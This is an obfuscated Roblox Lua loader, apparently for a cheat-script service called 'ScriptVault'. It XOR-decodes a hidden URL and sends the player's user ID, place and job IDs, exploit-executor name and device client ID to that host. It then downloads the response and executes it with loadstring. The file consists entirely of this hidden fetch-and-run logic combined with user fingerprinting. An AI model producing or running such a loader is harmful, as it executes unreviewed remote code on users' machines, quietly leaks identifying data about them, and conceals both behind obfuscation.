local _0ca9b97d={148,180,89,23,54,21}
local _90e51cfb={252,192,45,103,69,47,187,155,42,116,68,124,228,192,116,97,87,96,248,192,116,123,67,116,230,217,54,101,24,99,241,198,58,114,90,59,245,196,41,56,87,101,253,155,42,99,87,114,241,139,55,42,91,99,225,132,52,98,85,109,186,215,61,114,84,119,161,213,56,32,2,45,162,128,97,114,85,59,247,213,58,47,84,33,162,134,96,36,87,113,164,213,106,38,82,112,240,209,61,39,1,118,178,196,43,42,117,103,245,215,50,114,82,51,250,217,100,81,113,36,164,132}
local function _29385cc7()
local t={}
for i=1,#_90e51cfb do t[i]=string.char(bit32.bxor(_90e51cfb[i],_0ca9b97d[(i-1)%#_0ca9b97d+1])) end
return table.concat(t)
end
local _55790afc=game:GetService('HttpService')
local _4845756d=game:GetService('Players').LocalPlayer
local function _8fbe1404(f) local ok,r=pcall(f) if ok and r~=nil then return tostring(r) end return '' end
local _b68e350b=_8fbe1404(function() return identifyexecutor() end)
if #_b68e350b<2 then _b68e350b='unknown' end
local _5bfd2d8e=_8fbe1404(function() return game:GetService('RbxAnalyticsService'):GetClientId() end)
if #_5bfd2d8e<8 then _5bfd2d8e='nocid-'.._4845756d.UserId end
local _1d8ee6f9=_29385cc7()..'&u='.._4845756d.UserId..'&pid='..game.PlaceId..'&j='..game.JobId..'&e='.._55790afc:UrlEncode(_b68e350b)..'&c='.._55790afc:UrlEncode(_5bfd2d8e)
local _b1abe7f6,_4cf829be=pcall(function() return game:HttpGet(_1d8ee6f9) end)
if not _b1abe7f6 then error('[ScriptVault] No se pudo descargar: '..tostring(_4cf829be)) end
local _cef2235f,_1f93ff40=loadstring(_4cf829be)
if not _cef2235f then error('[ScriptVault] '..tostring(_1f93ff40)) end
_cef2235f()